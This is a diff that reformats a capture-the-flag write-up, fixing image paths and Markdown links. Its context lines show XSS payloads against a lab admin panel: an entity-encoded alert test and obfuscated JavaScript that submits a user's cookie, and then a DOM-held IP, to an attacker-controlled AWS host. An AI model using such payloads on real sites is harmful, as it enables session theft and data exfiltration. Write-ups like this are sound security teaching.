@@ -55,7 +55,7 @@ ebiRib
 
 Pass one of our answers to rumkin and look at answers.
 
-![Picture of solved substitution vipher](/pics/cap.png)
+![Picture of solved substitution vipher](/houseccon-2015-august/pics/cap.png)
 
 Due to the theme, try `POTATO` and register as user
 
@@ -84,7 +84,7 @@ PE32 executable for MS Windows (console) Intel 80386 Mono/.Net assembly
 
 ![Are you kidding me](http://images.sodahead.com/polls/004110707/235434734_Are_You_Kidding_Me_answer_11_xlarge.jpeg)
 
-Oh well, it's .NET. We know that .NET can be decompiled to source using (dotPeek)[https://www.jetbrains.com/decompiler/].
+Oh well, it's .NET. We know that .NET can be decompiled to source using [dotPeek](https://www.jetbrains.com/decompiler/).
 
 Looking at the source, it looks like we are given a fake terminal to attempt to wardial a given phone number. We are also given an area code and a set of prefixes. The source shows that if a certain `Dial` function succeeds, the terminal closes. We should be able to brute force this:
 
@@ -173,7 +173,7 @@ Password
 aaaa
 ```
 
-![Admin Panel](/pics/admin-panel.png)
+![Admin Panel](/houseccon-2015-august/pics/admin-panel.png)
 
 ## Get dat IP
 ```
@@ -188,7 +188,7 @@ Seeing a message box and a few "Active" users, hints strongly towards Cross-Site
 <img/src="./"/onerror="&#0097;&#00108;&#00101;&#00114;&#00116;&#0040;&#0039;&#0088;&#0083;&#0083;&#0039;&#0041;">
 ```
 
-[XSS 1](/pics/xss-1.png)
+![XSS 1](/houseccon-2015-august/pics/xss-1.png)
 
 
 Our next task, is to test if our "Active" users are actually active. Sending a simple `<IMG>` tag to `ctaroot` trying to access an image on my AWS instance gives a successful request.
@@ -207,9 +207,11 @@ $ python -m SimpleHTTPServer 80
 Awesome, so we do have "Active" users. As per typical XSS, let's try and steal the cookie for `ctaroot`. The idea being to submit an attacker generated form with the `ctaroot` cookie inside.
 
 Below is the XSS payload:
+```html
+<img/src="./"onerror="BELOW JAVASCRIPT"/>
 ```
-<img/src="./"onerror="
 
+```javascript
 // Create a new form and resubmit to 'send'
 // the document.cookie of the current user
 var/**/form/**/=/**/document.createElement('form');
@@ -232,7 +234,6 @@ hiddenField.setAttribute(String.fromCharCode(118, 97, 108, 117, 101),document.ge
 form.appendChild(hiddenField);
 document.body.appendChild(form);
 form.submit();
-"/>
 ```
 
 Sending this gives a gorgeous non-flag:
@@ -245,9 +246,11 @@ I must admit. I was a bit stumped for a minute, but one must move forward. I mad
 
 The next idea would be to try and pull the IP from the `ctaroot` DOM and then ship that instead of the cookie. The last thing would be to send this to an AWS instance instead of to `send`. Ultimately, this worked!
 
+```html
+<img/src="./"onerror="BELOW JAVASCRIPT"/>
 ```
-<img/src="./"onerror="
 
+```javascript
 // Create a new form with the IP from the DOM
 // Submit the form to a known AWS instance
 var/**/form/**/=/**/document.createElement('form');
@@ -270,7 +273,6 @@ hiddenField.setAttribute(String.fromCharCode(118, 97, 108, 117, 101),document.ge
 form.appendChild(hiddenField);
 document.body.appendChild(form);
 form.submit();
-"/>
 ```
 
 ```
